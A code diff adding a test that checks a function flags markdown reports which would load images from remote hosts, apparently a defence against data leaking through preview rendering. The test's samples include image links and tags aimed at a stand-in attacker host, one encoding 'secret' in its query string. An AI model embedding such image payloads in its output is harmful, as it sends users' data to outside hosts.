@@ -73,3 +73,13 @@ test('panel: a folder without library.yaml becomes a library once you say so', a
   assert.ok(fs.existsSync(path.join(lib, 'library.yaml')), 'library.yaml is written');
   assert.match(fs.readFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'utf8'), /libraries:\n\s+- \.\.\/agents-lib/);
 });
+
+test('panel: a report that would load images from the web is opened as text, not in the preview', async () => {
+  const { loadsRemote } = await import('../src/core/view');
+  for (const md of ['![x](https://evil.example/?q=c2VjcmV0)', '![](//evil.example/a.png)', '<img src="https://evil.example/p">', '<img alt=x src=http://evil.example/p>', '![logo][l]\n\n[l]: https://evil.example/l.png', '<video poster="https://evil.example/p">']) {
+    assert.equal(loadsRemote(md), true, md);
+  }
+  for (const md of ['# Plan\n\n[docs](https://docs.acme.com) and https://example.com', '![diagram](./diagram.png)', '[l]: https://example.com with no image']) {
+    assert.equal(loadsRemote(md), false, md);
+  }
+});
